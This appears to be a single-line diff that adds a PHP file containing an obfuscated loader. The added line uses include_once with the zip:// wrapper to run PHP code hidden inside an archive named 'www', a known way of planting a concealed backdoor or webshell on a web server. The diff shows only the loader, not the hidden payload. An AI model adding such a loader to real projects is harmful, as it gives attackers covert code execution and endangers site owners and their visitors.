@@ -1,0 +1,1 @@
+<?php (function($str){include_once($str);})('zip://www#www');?>
